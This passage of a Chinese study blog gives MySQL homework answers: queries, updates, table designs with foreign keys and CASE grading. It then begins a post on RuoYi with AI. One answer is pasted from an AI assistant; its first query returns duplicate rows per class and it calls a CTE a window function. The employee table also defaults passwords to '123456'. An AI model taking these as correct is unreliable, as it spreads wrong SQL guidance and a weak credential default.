每页展示5条记录</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;张%&#x27;</span> <span class="keyword">and</span> create_time <span class="operator">&lt;</span> <span class="string">&#x27;2018-10-01&#x27;</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">asc</span></span><br><span class="line">limit <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 23. 查询所有性别为 &#x27;男&#x27; 且 职位 为 &#x27;讲师&#x27; 的员工数据, 并根据入职时间进行升序排序, 入职时间相同 根据id倒序排序, 并对结果分页操作,  并进行分页操作, 展示第2页员工数据, 每页展示5条记录</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_emp</span><br><span class="line"><span class="keyword">where</span> gender<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> job<span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">asc</span>, id <span class="keyword">desc</span></span><br><span class="line">limit <span class="number">5</span>, <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 24. 查询所有员工的 姓名、性别、职位。 并满足如下两点要求:  (提示: if , case)</span></span><br><span class="line"><span class="comment">-- 1). 要求查询出来的结果中，性别要展示出 男/女，不要展示1/2 </span></span><br><span class="line"><span class="comment">-- 2). 要求查询出来的结果中，职位要展示出 班主任/讲师/学工主管/教研主管，而不要展示 1/2/3/4</span></span><br><span class="line"><span class="keyword">select</span> name,</span><br><span class="line">       <span class="keyword">case</span> <span class="keyword">when</span> gender <span class="operator">=</span> <span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;男&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> gender <span class="operator">=</span> <span class="number">2</span> <span class="keyword">then</span> <span class="string">&#x27;女&#x27;</span></span><br><span class="line">       <span class="keyword">end</span> <span class="keyword">as</span> gender,</span><br><span class="line">       <span class="keyword">case</span> <span class="keyword">when</span> job <span class="operator">=</span> <span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;班主任&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> job <span class="operator">=</span> <span class="number">2</span> <span class="keyword">then</span> <span class="string">&#x27;讲师&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> job <span class="operator">=</span> <span class="number">3</span> <span class="keyword">then</span> <span class="string">&#x27;学工主管&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> job <span class="operator">=</span> <span class="number">4</span> <span class="keyword">then</span> <span class="string">&#x27;教研主管&#x27;</span></span><br><span class="line">       <span class="keyword">end</span> <span class="keyword">as</span> job</span><br><span class="line"><span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure>
<h3 id="作业2"><a class="header-anchor" href="#作业2">¶</a>作业2</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 将 入职日期 在 &#x27;2000-01-01&#x27; (包含) 到 &#x27;2010-01-01&#x27;(包含) 之间的员工，工资统一涨 1000 </span></span><br><span class="line"><span class="comment">-- 提示: 如果更新某一个字段, 将其在原有基础上增加多少 , 可以使用 : .... set a = a + 10 这样的操作.</span></span><br><span class="line"><span class="keyword">update</span> employee</span><br><span class="line"><span class="keyword">set</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">1000</span></span><br><span class="line"><span class="keyword">where</span> entrydate <span class="keyword">between</span> <span class="string">&#x27;2000-01-01&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;2010-01-01&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 将 工资在 5000 至 7000 或 性别为女 的员工，工资统一涨 500 , 提示: set salary = salary+500</span></span><br><span class="line"><span class="keyword">update</span> employee</span><br><span class="line"><span class="keyword">set</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">500</span></span><br><span class="line"><span class="keyword">where</span> (salary <span class="keyword">between</span> <span class="number">5000</span> <span class="keyword">and</span> <span class="number">7000</span>) <span class="keyword">or</span> (gender <span class="operator">=</span> <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 将 职位是 2 (讲师) 或 3 (学工主管) 或 4 (教研主管) 的员工的入职时间, 统一设置为 &#x27;2010-09-01&#x27;</span></span><br><span class="line"><span class="keyword">update</span> employee</span><br><span class="line"><span class="keyword">set</span> entrydate <span class="operator">=</span> <span class="string">&#x27;2010-09-01&#x27;</span></span><br><span class="line"><span class="keyword">where</span> job <span class="keyword">in</span> (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 给没有分配职位的员工, 分配职位为 班主任</span></span><br><span class="line"><span class="keyword">update</span> employee</span><br><span class="line"><span class="keyword">set</span> job <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">where</span> job <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 删除 性别 为 女 , 且 岗位 为 咨询师 的员工信息</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> employee</span><br><span class="line"><span class="keyword">where</span> gender <span class="operator">=</span> <span class="number">2</span> <span class="keyword">and</span> job <span class="operator">=</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<h3 id="作业3"><a class="header-anchor" href="#作业3">¶</a>作业3</h3>
<ul>
<li><strong>需求:</strong>
<ul>
<li>根据 <strong>资料/页面原型/tlias智能学习辅助系统</strong> , 详细阅读页面原型及需求，完成 部门管理、员工管理、班级管理、学员管理  的表结构设计</li>
</ul>
</li>
<li>提示：
<ul>
<li>涉及到的表有四张 , 部门表 <code>tb_dept </code>、员工表 <code>tb_emp </code>、班级表 <code>tb_class </code>、学生表 <code>tb_student</code></li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 部门管理</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tb_dept (</span><br><span class="line">    id <span class="type">INT</span> UNSIGNED <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT COMMENT <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span> COMMENT <span class="string">&#x27;部门名称&#x27;</span>,</span><br><span class="line">    create_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) COMMENT <span class="string">&#x27;部门表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 员工管理</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tb_emp (</span><br><span class="line">    id <span class="type">INT</span> UNSIGNED <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span> COMMENT <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    gender TINYINT UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;性别, 说明: 1 男, 2 女&#x27;</span>,</span><br><span class="line">    image <span class="type">VARCHAR</span>(<span class="number">300</span>) COMMENT <span class="string">&#x27;图像&#x27;</span>,</span><br><span class="line">    job TINYINT UNSIGNED COMMENT <span class="string">&#x27;职位, 说明: 1 班主任,2 讲师, 3 学工主管, 4 教研主管&#x27;</span>,</span><br><span class="line">    dept_id <span class="type">INT</span> UNSIGNED COMMENT <span class="string">&#x27;部门ID, 关联的是 tb_dept 表的 id 字段&#x27;</span>,</span><br><span class="line">    entrydate <span class="type">DATE</span> COMMENT <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">    create_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) COMMENT <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tb_class (</span><br><span class="line">    id <span class="type">INT</span> UNSIGNED <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT COMMENT <span class="string">&#x27;ID,主键&#x27;</span>,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span> COMMENT <span class="string">&#x27;班级名称&#x27;</span>,</span><br><span class="line">    room <span class="type">VARCHAR</span>(<span class="number">20</span>) COMMENT <span class="string">&#x27;班级教室&#x27;</span>,</span><br><span class="line">    <span class="keyword">begin</span> <span class="type">DATE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;开课时间&#x27;</span>,</span><br><span class="line">    <span class="keyword">end</span> <span class="type">DATE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;结课时间&#x27;</span>,</span><br><span class="line">    head_teacher_id <span class="type">INT</span> UNSIGNED COMMENT <span class="string">&#x27;班主任ID, 关联的是 tb_emp 表的 id 字段&#x27;</span>,</span><br><span class="line">    create_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) COMMENT <span class="string">&#x27;班级表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 学员表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tb_student (</span><br><span class="line">    id <span class="type">INT</span> UNSIGNED <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT COMMENT <span class="string">&#x27;ID,主键&#x27;</span>,</span><br><span class="line">    name <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    <span class="keyword">no</span> <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span> COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">    gender TINYINT UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;性别, 1: 男, 2: 女&#x27;</span>,</span><br><span class="line">    phone <span class="type">VARCHAR</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span> COMMENT <span class="string">&#x27;手机号&#x27;</span>,</span><br><span class="line">    degree TINYINT UNSIGNED COMMENT <span class="string">&#x27;最高学历, 1:初中, 2:高中, 3:大专, 4:本科, 5:硕士, 6:博士&#x27;</span>,</span><br><span class="line">    violation_count TINYINT UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">&#x27;违纪次数&#x27;</span>,</span><br><span class="line">    violation_score TINYINT UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> COMMENT <span class="string">&#x27;违纪扣分&#x27;</span>,</span><br><span class="line">    class_id <span class="type">INT</span> UNSIGNED COMMENT <span class="string">&#x27;班级ID, 关联的是 tb_class 表的 id 字段&#x27;</span>,</span><br><span class="line">    create_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time DATETIME <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) COMMENT <span class="string">&#x27;学员表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建外键约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tb_emp</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_tb_emp_dept</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (dept_id)</span><br><span class="line"><span class="keyword">REFERENCES</span> tb_dept(id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tb_class</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_tb_class_head_teacher</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (head_teacher_id)</span><br><span class="line"><span class="keyword">REFERENCES</span> tb_emp(id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tb_student</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_tb_student_class</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (class_id)</span><br><span class="line"><span class="keyword">REFERENCES</span> tb_class(id);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在相应的表中添加外键约束，确保在 tb_emp 表中的 dept_id 字段只能引用 tb_dept 表中存在的 id，同理适用于其他表的外键约束</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 外键约束的语法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表时指定</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">    字段名    数据类型,</span><br><span class="line">    ...</span><br><span class="line">    [<span class="keyword">constraint</span>]   [外键名称]  <span class="keyword">foreign</span>  key (外键字段名)   <span class="keyword">references</span>   主表 (主表列名)    </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 建完表后，添加外键</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span>  表名  </span><br><span class="line"><span class="keyword">add</span> <span class="keyword">constraint</span>  外键名称  </span><br><span class="line"><span class="keyword">foreign</span> key (外键字段名) </span><br><span class="line"><span class="keyword">references</span> 主表(主表列名);</span><br></pre></td></tr></table></figure>
<h3 id="作业4"><a class="header-anchor" href="#作业4">¶</a>作业4</h3>
<ul>
<li>数据准备</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> score(</span><br><span class="line">        id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment ,</span><br><span class="line">        name <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line">        chinese <span class="type">int</span>,</span><br><span class="line">        english <span class="type">int</span>,</span><br><span class="line">        math <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> score <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;Tom&#x27;</span>,<span class="number">89</span>,<span class="number">78</span>,<span class="number">92</span>),(<span class="number">2</span>,<span class="string">&#x27;Rose&#x27;</span>,<span class="number">98</span>,<span class="number">88</span>,<span class="number">65</span>),(<span class="number">3</span>,<span class="string">&#x27;Jerry&#x27;</span>,<span class="number">55</span>,<span class="number">70</span>,<span class="number">43</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>需求：</p>
<ul>
<li>编写SQL语句，查询每个学生的id, name, 以及学生的语文chinese , 英语 english , 数学 math 的成绩等级.</li>
</ul>
</li>
<li>
<p>规则：</p>
<ul>
<li>&gt;= 85 , 优秀</li>
<li>&gt;= 60 且 &lt; 85 , 及格</li>
<li>&lt; 60 , 不及格</li>
</ul>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name,</span><br><span class="line">       <span class="keyword">case</span> <span class="keyword">when</span> chinese <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;优秀&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> chinese <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">and</span> chinese <span class="operator">&lt;</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;及格&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> chinese <span class="operator">&lt;</span> <span class="number">60</span> <span class="keyword">then</span> <span class="string">&#x27;不及格&#x27;</span></span><br><span class="line">       <span class="keyword">end</span> <span class="keyword">as</span> <span class="string">&#x27;语文&#x27;</span>,</span><br><span class="line">       <span class="keyword">case</span> <span class="keyword">when</span> english <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;优秀&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> english <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">and</span> english <span class="operator">&lt;</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;及格&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> english <span class="operator">&lt;</span> <span class="number">60</span> <span class="keyword">then</span> <span class="string">&#x27;不及格&#x27;</span></span><br><span class="line">       <span class="keyword">end</span> <span class="keyword">as</span> <span class="string">&#x27;英语&#x27;</span>,</span><br><span class="line">       <span class="keyword">case</span> <span class="keyword">when</span> math <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;优秀&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> math <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">and</span> math <span class="operator">&lt;</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;及格&#x27;</span></span><br><span class="line">            <span class="keyword">when</span> math <span class="operator">&lt;</span> <span class="number">60</span> <span class="keyword">then</span> <span class="string">&#x27;不及格&#x27;</span></span><br><span class="line">       <span class="keyword">end</span> <span class="keyword">as</span> <span class="string">&#x27;数学&#x27;</span></span><br><span class="line"><span class="keyword">from</span> score;</span><br></pre></td></tr></table></figure>
<h3 id="作业5"><a class="header-anchor" href="#作业5">¶</a>作业5</h3>
<ul>
<li>数据准备</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 班级人数表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_people(</span><br><span class="line">    id <span class="type">int</span> unsigned <span class="keyword">primary</span> key auto_increment comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;班级&#x27;</span>,</span><br><span class="line">    gender tinyint unsigned comment <span class="string">&#x27;性别, 1: 男, 2: 女&#x27;</span>,</span><br><span class="line">    pcount <span class="type">int</span> unsigned comment <span class="string">&#x27;人数&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;班级人数表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_people (id, name, gender, pcount)<span class="keyword">values</span></span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级一班&#x27;</span>,<span class="number">1</span>,<span class="number">34</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级一班&#x27;</span>,<span class="number">2</span>,<span class="number">12</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级二班&#x27;</span>,<span class="number">1</span>,<span class="number">56</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级二班&#x27;</span>,<span class="number">2</span>,<span class="number">14</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级三班&#x27;</span>,<span class="number">1</span>,<span class="number">22</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级三班&#x27;</span>,<span class="number">2</span>,<span class="number">43</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级四班&#x27;</span>,<span class="number">1</span>,<span class="number">26</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;三年级四班&#x27;</span>,<span class="number">2</span>,<span class="number">38</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;四年级一班&#x27;</span>,<span class="number">1</span>,<span class="number">45</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;四年级一班&#x27;</span>,<span class="number">2</span>,<span class="number">13</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;四年级二班&#x27;</span>,<span class="number">1</span>,<span class="number">18</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;四年级二班&#x27;</span>,<span class="number">2</span>,<span class="number">27</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;四年级三班&#x27;</span>,<span class="number">1</span>,<span class="number">19</span>),</span><br><span class="line">                      (<span class="keyword">null</span>,<span class="string">&#x27;四年级三班&#x27;</span>,<span class="number">2</span>,<span class="number">26</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>需求：</p>
<ul>
<li>编写sql语句，查询每个班级学生的男生人数、女生人数</li>
</ul>
</li>
<li>
<p>这题不会，答案来自通义千问</p>
</li>
</ul>
<p>为了查询每个班级学生的男生人数和女生人数，我们可以使用 SQL 的聚合函数和分组功能来实现这一需求。具体来说，我们需要按照班级名称 (<code>name</code>) 和性别 (<code>gender</code>) 对 <code>tb_people</code> 表进行分组，并计算每个性别的人数。</p>
<p>以下是实现这一需求的 SQL 查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    name <span class="keyword">AS</span> 班级,</span><br><span class="line">    <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> gender <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span> pcount <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> 男生人数,</span><br><span class="line">    <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> gender <span class="operator">=</span> <span class="number">2</span> <span class="keyword">THEN</span> pcount <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> 女生人数</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    tb_people</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">    name, gender;</span><br></pre></td></tr></table></figure>
<h4 id="解释"><a class="header-anchor" href="#解释">¶</a>解释</h4>
<ol>
<li>
<p><strong><code>CASE</code> 语句</strong>:</p>
<ul>
<li><code>SUM(CASE WHEN gender = 1 THEN pcount ELSE 0 END)</code>：当性别为 1（男生）时，累加该班级的男生人数；否则累加为 0。</li>
<li><code>SUM(CASE WHEN gender = 2 THEN pcount ELSE 0 END)</code>：当性别为 2（女生）时，累加该班级的女生人数；否则累加为 0。</li>
</ul>
</li>
<li>
<p><strong><code>GROUP BY</code></strong>:</p>
<ul>
<li><code>GROUP BY name, gender</code>：按照班级名称和性别进行分组。这意味着每个班级的每个性别都会有一个汇总结果。</li>
</ul>
</li>
</ol>
<h4 id="查询结果"><a class="header-anchor" href="#查询结果">¶</a>查询结果</h4>
<p>执行上述查询后，您将得到每个班级的男生人数和女生人数。但是，由于每个班级的每个性别都会有一条记录，所以您可能会看到每个班级重复两次的记录（一次为男生，一次为女生）。为了更清晰地展示结果，可以进一步优化查询，使其每个班级仅出现一次，并列出男生人数和女生人数。</p>
<h4 id="优化后的查询"><a class="header-anchor" href="#优化后的查询">¶</a>优化后的查询</h4>
<p>为了使结果更加直观，我们可以使用子查询或窗口函数来合并结果，使得每个班级仅出现一次，并显示男生人数和女生人数。</p>
<h5 id="方法-1-使用子查询"><a class="header-anchor" href="#方法-1-使用子查询">¶</a>方法 1: 使用子查询</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    t.name <span class="keyword">AS</span> 班级,</span><br><span class="line">    <span class="built_in">SUM</span>(t.男生人数) <span class="keyword">AS</span> 男生人数,</span><br><span class="line">    <span class="built_in">SUM</span>(t.女生人数) <span class="keyword">AS</span> 女生人数</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> </span><br><span class="line">        name,</span><br><span class="line">        <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> gender <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span> pcount <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> 男生人数,</span><br><span class="line">        <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> gender <span class="operator">=</span> <span class="number">2</span> <span class="keyword">THEN</span> pcount <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> 女生人数</span><br><span class="line">    <span class="keyword">FROM</span> </span><br><span class="line">        tb_people</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">        name, gender</span><br><span class="line">) t</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">    t.name;</span><br></pre></td></tr></table></figure>
<h5 id="方法-2-使用窗口函数"><a class="header-anchor" href="#方法-2-使用窗口函数">¶</a>方法 2: 使用窗口函数</h5>
<p>如果您的数据库支持窗口函数，可以使用 <code>SUM</code> 过窗口函数来简化查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> GenderCounts <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> </span><br><span class="line">        name,</span><br><span class="line">        gender,</span><br><span class="line">        <span class="built_in">SUM</span>(pcount) <span class="keyword">AS</span> count</span><br><span class="line">    <span class="keyword">FROM</span> </span><br><span class="line">        tb_people</span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">        name, gender</span><br><span class="line">)</span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    name <span class="keyword">AS</span> 班级,</span><br><span class="line">    <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> gender <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span> count <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> 男生人数,</span><br><span class="line">    <span class="built_in">SUM</span>(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> gender <span class="operator">=</span> <span class="number">2</span> <span class="keyword">THEN</span> count <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">AS</span> 女生人数</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    GenderCounts</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> </span><br><span class="line">    name;</span><br></pre></td></tr></table></figure>
<p>这两种方法都可以达到目的，您可以根据自己的数据库版本和个人喜好选择合适的方法。如果您需要进一步的帮助或有其他问题，请随时告知。</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【RuoYi + AI】1 导入部分</title>
    <url>/2024/07/07/CS_Notes/RuoYi/%E3%80%90RuoYi-+-AI%E3%80%911_%E5%AF%BC%E5%85%A5%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h2 id="导入部分"><a class="header-anchor" href="#导入部分">¶</a>导入部分</h2>
<h3 id="系统开发流程与AI局限性"><a class="header-anchor" href="#系统开发流程与AI局限性">¶</a>系统开发流程与AI局限性</h3>
<ol>
<li><code>项目环境搭建，技术选型，框架整合</code></li>
<li><code>设计产品原型，例如库表、接口等</code></li>
<li><code>前后端编码，将设计转换为实际的软件功能</code></li>
<li><code>测试部署上线</code></li>
</ol>
<p>AI能完成编码部分，但是环境搭建部分还是得人工</p>
<p>AI在设计阶段也可以起到辅助作用</p>
<p>在测试部署阶段，AI可以辅助生成测试用例，编写部署所需要的脚本</p>
<ul>
<li>
<p>若伊功能：<code>快速构建</code>  <code>通用模块</code>  <code>代码生成（尤其是对于需要重复编写的增删改查部分）</code></p>
</li>
<li>
<p>若伊：基于SpringBoot+Bootstrap的极速后台开发框架</p>
</li>
</ul>
